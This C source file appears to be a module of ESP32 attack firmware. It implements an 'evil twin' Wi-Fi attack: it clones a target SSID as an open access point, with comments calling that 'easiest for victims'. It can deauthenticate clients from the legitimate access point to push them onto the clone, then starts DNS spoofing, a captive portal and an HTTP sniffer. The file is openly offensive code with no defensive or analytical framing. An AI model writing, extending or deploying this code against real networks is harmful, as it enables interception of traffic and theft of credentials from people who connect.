#include "wifi_engine.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "esp_netif.h"
#include "esp_event.h"
#include "lwip/inet.h"
#include <string.h>

static const char *TAG = "EVILTWIN";
static bool s_running = false;
static evil_twin_cfg_t s_cfg = {0};
static uint8_t s_client_count = 0;

static void wifi_ap_event_handler(void *arg, esp_event_base_t event_base,
                                   int32_t event_id, void *event_data)
{
    if (event_id == WIFI_EVENT_AP_STACONNECTED) {
        wifi_event_ap_staconnected_t *e = (wifi_event_ap_staconnected_t *)event_data;
        s_client_count++;
        char mac_str[18];
        wifi_mac_to_str(e->mac, mac_str);
        ESP_LOGI(TAG, "Client CONNECTED → %s (total: %d)", mac_str, s_client_count);
    } else if (event_id == WIFI_EVENT_AP_STADISCONNECTED) {
        if (s_client_count > 0) s_client_count--;
    }
}

esp_err_t wifi_eviltwin_start(const evil_twin_cfg_t *cfg)
{
    if (s_running) wifi_eviltwin_stop();
    memcpy(&s_cfg, cfg, sizeof(s_cfg));
    s_client_count = 0;

    /* Stop any existing deauth on that AP, then restart pointing at our clone */
    esp_wifi_set_mode(WIFI_MODE_APSTA);

    wifi_config_t ap_cfg = {0};
    strncpy((char *)ap_cfg.ap.ssid, cfg->ssid, sizeof(ap_cfg.ap.ssid) - 1);
    ap_cfg.ap.channel        = cfg->channel;
    ap_cfg.ap.max_connection = 16;
    ap_cfg.ap.authmode       = WIFI_AUTH_OPEN; /* Open = easiest for victims */

    if (strlen(cfg->password) > 0) {
        strncpy((char *)ap_cfg.ap.password, cfg->password,
                sizeof(ap_cfg.ap.password) - 1);
        ap_cfg.ap.authmode = cfg->authmode;
    }

    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_cfg));

    esp_event_handler_register(WIFI_EVENT, WIFI_EVENT_AP_STACONNECTED,
                                wifi_ap_event_handler, NULL);
    esp_event_handler_register(WIFI_EVENT, WIFI_EVENT_AP_STADISCONNECTED,
                                wifi_ap_event_handler, NULL);

    /* Trigger deauth on legitimate AP to force clients over */
    if (cfg->deauth_legit) {
        ESP_LOGI(TAG, "Deauthing legitimate AP to force client migration...");
        wifi_deauth_start(cfg->legit_bssid, NULL, cfg->channel, 100, 5000);
    }

    s_running = true;
    ESP_LOGI(TAG, "Evil Twin running: SSID='%s' ch=%d", cfg->ssid, cfg->channel);

    /* Start supporting services */
    dns_spoof_start("192.168.4.1");
    captive_portal_start("default");
    http_sniffer_start();

    return ESP_OK;
}

esp_err_t wifi_eviltwin_stop(void)
{
    if (!s_running) return ESP_OK;
    dns_spoof_stop();
    captive_portal_stop();
    http_sniffer_stop();
    wifi_deauth_stop();
    s_running = false;
    s_client_count = 0;
    ESP_LOGI(TAG, "Evil Twin stopped");
    return ESP_OK;
}

uint8_t wifi_eviltwin_get_client_count(void) { return s_client_count; }
